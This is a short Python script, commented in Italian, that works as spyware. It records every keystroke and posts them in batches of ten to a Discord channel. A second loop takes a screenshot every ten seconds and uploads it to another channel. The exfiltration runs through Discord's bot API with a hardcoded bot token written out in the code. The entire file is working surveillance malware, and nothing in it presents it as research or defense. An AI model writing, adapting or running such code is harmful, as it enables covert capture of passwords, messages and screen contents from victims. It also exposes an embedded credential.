import keyboard
import requests
import threading
import time
import pyautogui
import os

# ================= CONFIG =================
TOKEN = 'MTQyMjYzNzQ2NTQ5MTA3OTMxOQ.G36IWs.krFP5HY-74meVjEcLM63v1PME2tmR6ZF5msaME'

# Canale testo (vecchio)
CHANNEL_ID = '1303100129083134056'
URL_TEXT = f'https://discord.com/api/v9/channels/{CHANNEL_ID}/messages'

# Canale screenshot (nuovo)
SCREEN_CHANNEL_ID = '1462145403196539027'

# ================= KEYLOGGER =================
keys = []
count = 0

def send_to_discord(message):
    data = {'content': message}
    headers = {'Authorization': f'Bot {TOKEN}'}
    try:
        requests.post(URL_TEXT, json=data, headers=headers)
    except Exception as e:
        print(f"[ERROR] Invio testo: {e}")

def on_key_event(event):
    global keys, count
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        if key == 'space':
            key = '[SPACE]'
        elif key == 'enter':
            key = '[ENTER]'
        elif key == 'backspace':
            key = '[BACKSPACE]'
        elif len(key) > 1:
            key = f"[{key.upper()}]"
        keys.append(key)
        count += 1
        if count >= 10:
            send_to_discord(' '.join(keys))
            keys = []
            count = 0

def start_keylogger():
    keyboard.hook(on_key_event)
    keyboard.wait()  # aspetta input

# ================= SCREENSHOT =================
def send_screenshot_to_discord(token, channel_id):
    """
    Scatta uno screenshot e lo invia su Discord con timestamp hh:mm:ss
    """
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    headers = {'Authorization': f'Bot {token}'}

    timestamp = time.strftime("%H:%M:%S")
    filename = 'screenshot.png'

    try:
        pyautogui.screenshot(filename)
        data = {'content': f'🕒 {timestamp}'}
        with open(filename, 'rb') as img:
            files = {'file': ('screenshot.png', img, 'image/png')}
            r = requests.post(url, headers=headers, data=data, files=files)
            if r.status_code not in (200, 201):
                print(f"[ERROR] Screenshot: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"[ERROR] Screenshot: {e}")
    finally:
        if os.path.exists(filename):
            os.remove(filename)

def screenshot_loop(token, channel_id, delay=10):
    while True:
        send_screenshot_to_discord(token, channel_id)
        time.sleep(delay)

# ================= MAIN =================
if __name__ == "__main__":
    # Avvia keylogger
    threading.Thread(target=start_keylogger, daemon=True).start()

    # Avvia screenshot automatici
    threading.Thread(
        target=screenshot_loop,
        args=(TOKEN, SCREEN_CHANNEL_ID, 10),
        daemon=True
    ).start()

    print("Script attivo: keylogger + screenshot automatici")
    while True:
        time.sleep(1)
